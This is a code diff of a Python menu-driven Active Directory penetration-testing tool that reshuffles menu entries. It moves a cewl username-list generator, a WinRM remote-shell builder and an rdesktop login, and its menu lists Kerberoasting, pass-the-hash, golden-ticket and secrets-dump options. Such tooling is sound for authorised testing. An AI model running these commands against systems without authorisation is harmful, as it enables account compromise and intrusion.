@@ -270,12 +270,12 @@ def display():
    print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH    " + '\u2551')
    print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) Blood Hound  (62) TelNet " + '\u2551')
    print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) BH ACLPwn    (63) NetCat " + '\u2551')
-   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64)        " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65)        " + '\u2551')
+   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) WinRM  " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) Desktop" + '\u2551')
    print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PsExec HASH  (66)        " + '\u2551')
    print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)        " + '\u2551')
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)        " + '\u2551')
-   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) Remote Login (69) Desktop" + '\u2551')
+   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) Gen Userlist (69)        " + '\u2551')
    print('\u255A' + ('\u2550')*132 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -1220,10 +1220,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      print("\n[+] Please wait...")
-      if linecache.getline('users.txt', 1) == "":
-         print("[+] User file empty - generating bespoke username list from host...\n")
-         command("cewl -d 2 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
+      print("\n[+] Please wait...")      
       print("\n[+] Checking to see if any found username is assigned to Kerberous...")
       command("nmap -p 88 -script krb5-enum-users -script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       command("sed -i '/@/!d' KUSERS.tmp")
@@ -1621,27 +1618,27 @@ while True:
          command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))   
       else:
          print("No hash value was found for user " + POR.rstrip(" ") + "...")
-      prompt()
+      prompt()     
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - Windows remote login on port 5985.
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
-      command('echo "require \'winrm\' " > winshell.rb')
-      command('echo "" >> winshell.rb')
-      command('echo "conn = WinRM::Connection.new(" >> winshell.rb')
-      command('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
-      command('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
-      command('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
-      command('echo ")" >> winshell.rb')
-      command("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
-      command("ruby winshell.rb")
-      prompt()         
+      command("cewl -d 2 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
+      print("\nUserlist generated via website...")
+      for x in range (0,MAX):
+         US[x] = linecache.getline("users.txt", x+1)
+         US[x] = US[x].rstrip(" ")
+         if len(US[x]) < COL3:
+            US[x] = padding(US[x], COL3)
+      if US[12] != "                          ":
+         US[11] = "Some users are not shown!!"
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1695,34 +1692,33 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='64':
-      exit(1) 
+      command('echo "require \'winrm\' " > winshell.rb')
+      command('echo "" >> winshell.rb')
+      command('echo "conn = WinRM::Connection.new(" >> winshell.rb')
+      command('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
+      command('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
+      command('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
+      command('echo ")" >> winshell.rb')
+      command("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
+      command("ruby winshell.rb")
+      prompt() 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-      exit(1)       
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='66':
-      exit(1)       
+      command("rdesktop -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1745,17 +1741,17 @@ while True:
 
    if selection =='68':
       exit(1)              
-
-# ------------------------------------------------------------------------------------- 
+#------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      command("rdesktop -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
-      prompt()
+      exit(1)       
+
+
 
 #Eof...	
